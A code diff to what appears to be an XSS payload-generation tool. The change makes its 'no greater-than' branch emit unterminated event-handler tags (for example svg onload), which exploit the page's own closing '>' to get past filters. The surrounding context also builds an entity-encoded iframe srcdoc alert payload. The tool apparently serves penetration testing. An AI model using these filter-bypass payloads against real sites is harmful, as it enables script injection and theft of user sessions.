@@ -316,10 +316,26 @@ def compose(ctx, quote, scores, kw=None, kwv=None):
                      or not kw.get("alert", True)):
                 add(f'<iframe {marker} srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>',
                     "iframe srcdoc entity-encoded", "special_attrs")
-        elif usable("<", scores) and not usable(">", scores) and funcs \
-                and kw.get("svg_tag", True) and kw.get("onload", True) \
-                and kw.get("pair_svg_onload", True):
-            add(f"<svg onload={funcs[0]}//", "no greater-than (svg onload)", "gt_missing")
+        elif usable("<", scores) and not usable(">", scores) and funcs:
+            # "no greater-than" (case: xss without greater than.md): the
+            # tag stays unterminated and the page's OWN next '>' closes
+            # it. A '<tag>' keyword can only fail HERE because its '>'
+            # vanished -- gating on it makes this branch unreachable, so
+            # instead check the bare NAME survived via kwv got_back:
+            # '<svg>' -> '<svg' means only the '>' was stripped.
+            def name_ok(key):
+                if kw.get(key, True):
+                    return True
+                e, g = kwv.get(key, ("", ""))
+                return bool(e) and g == e.replace(">", "")
+            for tag, ev, extra, deps in TAG_HANDLERS:
+                others = [d for d in deps if d != deps[0]]
+                if name_ok(deps[0]) and \
+                        all(kw.get(d, True) for d in others):
+                    for fn in funcs[:2]:
+                        add(f"<{tag} {extra} {marker} {ev}={fn}//"
+                            .replace("  ", " "),
+                            f"no greater-than ({tag} {ev})", "gt_missing")
 
     elif ctx == "attr":
         if tags_ok and q_ok and quote:
